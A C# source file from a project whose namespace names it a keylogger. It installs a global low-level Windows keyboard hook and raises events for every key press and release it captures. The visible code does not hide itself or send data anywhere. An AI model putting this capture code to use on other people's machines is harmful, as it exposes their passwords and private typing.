using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using KeyBoardHook.KeyLogger.Entity;
using KeyBoardHook.KeyLogger.Enums;
using KeyBoardHook.KeyLogger.Native;

namespace KeyBoardHook.KeyLogger.Hooker
{
    internal class KeyboardHook
    {
        private const int WM_KEYDOWN = 0x100;
        private const int WM_SYSKEYDOWN = 0x104;
        private const int WM_KEYUP = 0x101;
        private const int WM_SYSKEYUP = 0x105;

        private IntPtr _keyboardHookHandle;
        private readonly KeyProcessing _keyProcessing;

        public event EventHandler<StringDownEventArgs> StringDown;
        public event EventHandler<StringDownEventArgs> StringUp;
        
        public KeyboardHook()
        {
            _keyProcessing = new KeyProcessing();
            _keyProcessing.StringUp += _keyProcessing_StringUp;
            _keyProcessing.StringDown += _keyProcessing_StringDown;
      

        }

        public void Hook()
        {
            if (_keyboardHookHandle != IntPtr.Zero)
                return;
            
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                _keyboardHookHandle = NativeMethods.SetWindowsHookEx(
                    HookType.WH_KEYBOARD_LL,
                    KeyboardHookProc, NativeMethods.GetModuleHandle(curModule.ModuleName),
                    0);
            }

            if (_keyboardHookHandle == IntPtr.Zero)
            {
                var errorCode = Marshal.GetLastWin32Error();
                throw new Win32Exception(errorCode);
            }
        }
        
        public void UnHook()
        {
            if (_keyboardHookHandle != IntPtr.Zero)
            {
                var result = NativeMethods.UnhookWindowsHookEx(_keyboardHookHandle);
                if (result == false)
                {
                    var errorCode = Marshal.GetLastWin32Error();
                }
                else
                {
                    _keyboardHookHandle = IntPtr.Zero;
                }
            }
        }

        private void _keyProcessing_StringDown(object sender, StringDownEventArgs e)
        {
            StringDown?.Invoke(this, e);
        }

        private void _keyProcessing_StringUp(object sender, StringDownEventArgs e)
        {
            StringUp?.Invoke(this, e);
        }
        private IntPtr KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                var wParamInt = wParam.ToInt32();

                var myKeyboardHookStruct =
                    (KeyboardHookStruct) Marshal.PtrToStructure(lParam, typeof (KeyboardHookStruct));
                if ((StringDown != null ) && (wParamInt == WM_KEYDOWN || wParamInt == WM_SYSKEYDOWN))
                {
                    if (StringDown != null)
                    {
                        _keyProcessing.ProcessKeyAction((uint) myKeyboardHookStruct.VirtualKeyCode,
                            (uint) myKeyboardHookStruct.ScanCode, true);
                    }
                }
            
                if ((StringUp != null ) && (wParamInt == WM_KEYUP || wParamInt == WM_SYSKEYUP))
                {

                    if (StringUp != null)
                    {
                        _keyProcessing.ProcessKeyAction((uint) myKeyboardHookStruct.VirtualKeyCode,
                            (uint) myKeyboardHookStruct.ScanCode, false);
                    }
                }
            }

            return NativeMethods.CallNextHookEx(_keyboardHookHandle, nCode, wParam, lParam);
        }
    }
}